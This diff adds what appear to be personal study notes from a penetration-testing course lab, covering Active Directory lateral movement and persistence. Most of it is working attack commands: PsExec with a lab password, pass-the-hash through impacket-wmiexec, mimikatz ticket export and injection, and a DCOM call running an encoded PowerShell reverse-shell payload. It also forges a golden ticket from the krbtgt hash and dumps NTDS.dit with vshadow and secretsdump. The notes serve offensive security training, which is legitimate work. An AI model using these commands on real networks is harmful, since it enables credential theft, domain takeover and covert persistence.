@@ -3267,3 +3267,160 @@ To interact with the session ID 1 we created, we can issue the Enter-PSSession c
 ```
 Enter-PSSession 1
 ```
+
+### PSExec
+To begin, the user that authenticates to the target machine needs to be part of the Administrators local group. In addition, the ADMIN$ share must be available and File and Printer Sharing has to be turned on. Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems
+
+can transfer PSExec64.exe to target machine
+
+we can then execute the following
+```
+./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+```
+
+### Pass the Hash
+
+can use wmiexec to pass NTLM hash (doesn't work for kerberos). Need to pass the hash of local admin
+
+```
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+```
+
+### Overpass the Hash
+use NTLM hash to get TGT, then use TGT to get TGS (ticket-granting service)
+first need to run process as a different user.
+then use mimikatz to get the password hash
+afterwards pass that hash to the following
+
+```
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+```
+
+now we can run commands as jen
+
+to view cached tickets use
+```
+net use \\files04
+klist
+```
+
+now we can run tools like official PSExec without password
+```
+cd C:\tools\SysinternalsSuite\
+.\PsExec.exe \\files04 cmd
+```
+
+### Pass the ticket
+The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.
+
+we'll get access denied if we try to access service without TGS
+```
+ls \\web04\backup
+```
+
+we need to launch mimikatz and export all tickets from other users from memory
+```
+privilege::debug
+sekurlsa::tickets /export
+```
+
+verifiy existing tickets with
+```
+dir *.kirbi
+```
+
+we can then inject a ticket into our own session
+```
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+```
+
+then verify with
+```
+klist
+```
+
+now the following command should work
+```
+ls \\web04\backup
+```
+### DCOM
+Distributed Computer Object Model
+
+Performed on TCP 135 -- local admin access required
+
+can get a reverse shell with command execution
+```
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
+```
+
+## AD Persistence
+### Golden ticket
+To get TGT, we need to know password hash of krbtgt.  If we have this, we can craft our own tickets
+
+silver ticket -> force TGS for specific service
+golden ticket -> entire domain access
+
+as test case, try to access DC
+```
+PsExec64.exe \\DC1 cmd.exe
+```
+
+At this stage of the engagement, the golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself in order to work as a persistence method.
+
+```
+privilege::debug
+lsadump::lsa /patch
+```
+
+this will give us SID of domain + NTLM hash of krbtgt
+
+before getting golden ticket, we should purge existing tickets
+```
+kerberos::purge
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+misc::cmd
+```
+
+now we can re-run psexec
+```
+PsExec.exe \\dc1 cmd.exe
+ipconfig
+whoami
+whoami /groups
+```
+
+Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication as we discussed earlier in this Module. If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked as the next listing shows.
+
+### AD Persistence
+A Shadow Copy,1 also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes.
+
+To manage volume shadow copies, the Microsoft signed binary vshadow.exe2 is offered as part of the Windows SDK.
+
+can use vshadow utility to extract AD database NTDS.dit. then we can extract every user credential offline
+
+first connect to DC as domain admin, then launch
+```
+vshadow.exe -nw -p  C:
+```
+
+we should take note of shadow copy device name from output
+```
+- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+```
+
+We'll now copy the whole AD Database from the shadow copy to the C: drive root folder by specifying the shadow copy device name and append the full ntds.dit path.
+```
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
+```
+
+As a last ingredient, to correctly extract the content of ntds.dit, we need to save the SYSTEM hive from the Windows registry. We can accomplish this with the reg utility and the save argument.
+```
+reg.exe save hklm\system c:\system.bak
+```
+
+we then move the two .bak files to our windows machine and crack them
+```
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+```
